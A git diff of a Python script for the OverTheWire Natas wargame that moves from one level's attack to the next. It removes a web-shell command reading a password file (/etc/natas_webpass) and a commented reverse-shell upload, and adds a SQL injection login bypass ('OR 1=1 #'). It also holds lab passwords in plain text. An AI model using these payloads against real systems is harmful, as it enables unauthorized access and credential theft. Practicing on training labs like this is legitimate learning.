@@ -12,18 +12,14 @@ A script to use in Natas Wargame room in OvertheWire
 import re
 import requests
 
-username = 'natas12'
-password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
+username = 'natas14'
+password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
 
 url = 'http://%s.natas.labs.overthewire.org/' % username
 
 session = requests.Session()
 # response = session.get(url, auth=(username, password))
-# response = session.post(url, files={"uploadedfile": open('revshell.php', 'rb')}, data={"filename": "revshell.php", "MAX_FILE_SIZE":
-#                              "1000"}, auth=(username, password))
-
-response = session.get(
-    url + 'upload/qqzq86fcyb.php?c=cat /etc/natas_webpass/natas13', auth=(username, password))
+response = session.post(url, data={"username": 'please" OR 1=1 #',
+                                   "password": "subscribe"}, auth=(username, password))
 content = response.text
-
 print(content)
